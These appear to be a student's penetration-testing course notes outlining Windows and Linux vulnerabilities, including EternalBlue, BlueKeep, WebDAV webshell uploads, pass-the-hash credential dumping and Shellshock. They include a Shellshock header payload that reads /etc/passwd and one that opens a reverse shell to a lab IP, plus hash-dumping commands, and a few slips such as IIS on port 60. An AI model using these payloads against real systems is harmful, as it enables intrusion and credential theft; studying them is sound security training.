Vulnerability assesmnent

- Overview of Windows vulnerabilities
    - Windows is the dominant operating system (>= 70% market share)
    - Popular vulns: EternalBlue, Conflicker
    - Windows OS's have benn developed in the C programming language, making them vulnerable to buffer overflows
    - By default, Windows is not configured to run securely
    - New vulnerabilities are not patched immediately
    - Types of Windows vulnerabilities:
        1. Information disclosure
        2. Buffer overflows
        3. Remote code execution (RCE)
        4. Privilege escalation 
        5. Denial of Service
    
- Frequently exploited Windows services
    - Windows has various native services and protocols that can be run on a host
    - Microsoft IIS
        - Web server technology
        - TCP port 60 or 443
    - WebDAV
        - HTTP extension that allows clients to modify files on a web server
        - TCP port 80 or 443
    - SMB/CIFS
        - Network file sharing 
        - TCP port 445
    - RDP (Remote Desktop Protocol)
        - GUI remote access protocol 
        - TCP port 3389
    - WinRM
        - Windows remote management protocol for remote access 
        - TCP port 5986 or 443

- Vulnerability scanning with metasploit
    - Process of scanning and detecting vulnerabilites and verifying wether they can be exploited
    - db_nmap -sS -sV -O <ip>
    - search type:exploit name:Microsoft IIS
    - set payload windows/meterpreter/reverse_tcp
    - searchsploit <service>
    - metasploit-autopwn
    - db_autopwn -p -t -PI <port>
    - analyze

- WebDAV vulnerabilities
    - Supported IIS executable file estensions: 
        - .asp
        - .aspx
        - .config
        - .php
    - WebDAV runs on top of IIS, it is used to allow users to collaboratively edit and manage files
    - Auth is implemented with username and password
    - Identify, brute-force, upload malicious .asp
    - davtest is a tool to scan, authenticate and exploit
    - cadaver is another tool
    - davtest -url http://demo.ine.local/webdav/ -auth bob:password_123321
    - put /usr/share/webshells/asp/webshell.asp

Vulnerability analysis

- EternalBlue
    - Takes advantage of a vulnerability that allows to send specially crafted packets
    - Targets SMB version 1
    - It affects multiple windows versions
    - MSF has a module to check if a system is vulnerable
    - nmap -sV -p 445 --script=smb-vuln-ms17-010 <ip>
    - Manual exploitation with AutoBlue-MS17-010
    - Automatic exploitation with msfconsole
        - search eternalblue
        - exploit
    
- BlueKeep
    - RDP vulnerability in Windows
    - Used to gain access to a chunk of kernel memory
    - It affects multiple versions of windows
    - msfconsole used for automatic exploitation
        - show targets
    - This exploit can crash systems

- Pass-The-Hash Attacks
    - Involves capturing NTLM hashes or clear-text passwords and use them to authenticate with the target
    - Tools to be used:
        - psexec (metasploit)
        - Crackmapexec
    - Pass-The-Hash is used to authenticate legitmately (persistance)
    - Get hashes:
        - psgrep lsass
        - migrate x
        - load kiwi
        - lsa_dump_sam
        - hashdump
    - psexec
        - remeber to set target and set user and password/hash
        - needs LM and NTLM hashes
    - crackmapexec smb <ip> -u <user> -H "<NTLM hash>" -x "<command>"

- Frequently exploited linux services
    - Linux kernel + GNU toolkit = GNU/Linux
    - Services:
        - Apache Web server: TCP port 80 or 443
        - SSH: TCP port 22
        - FTP: TCP port 21
        - SAMBA: TCP port 445

- Shellshock
    - CVE-2014-6271
    - Vulnerability in the Bash shell
    - Bash is the default shell for most Linux distributions
    - Apache web servers configured to run CGI (Common Gateway Interface) or .sh scripts are vulnerable
    - CGI are used by Apache to execute arbitrary commands after which the output is displayed to the client
    - nmap -sV <ip> --script=http-shellshock --script-args "http-shellshock.uri=/<cgi script>"
    - Replace User-Agent with: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
    - () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/192.161.118.2/1234 0>&1'

Vulnerability scanning

- Vulnerability scanning with Nessus
    - Propietary vulnerability scanner
    - We can scan a target and then import the results to metasploit
    - Host discovery + port scanner + service and version scan + vulnerability scan
    - Nessus Essentials allows for 16 IPs to be scanned

- Web App Vulnerability scanning with WMAP
    - WMAP is available as an MSF plugin and can be loaded directly into mestasploit
    - When using metasploit:
        - load wmap 
        - wmap_*
        - wmap_sites -a <ip>
        - wmap_target -t http://<ip>/
        - wmap_run -t
        - wmap_run -e